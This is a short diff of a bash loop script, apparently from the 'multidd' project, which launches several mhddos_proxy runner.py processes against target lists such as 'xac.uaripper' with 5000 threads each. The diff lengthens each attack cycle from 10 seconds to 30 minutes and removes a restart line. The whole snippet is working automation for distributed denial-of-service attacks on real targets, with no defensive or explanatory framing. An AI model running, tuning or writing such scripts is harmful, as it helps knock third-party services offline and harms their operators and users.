@@ -153,9 +153,8 @@ while true; do
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 5000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 5000 $args_to_pass &
     fi
-sleep 10
+sleep 30m
 pkill -f start.py; pkill -f runner.py;
-bash md2.sh --low; tmux kill-session -t multidd
 prepare_targets_and_banner
 rm -rf ~/multidd/mhddos_proxy/
 done
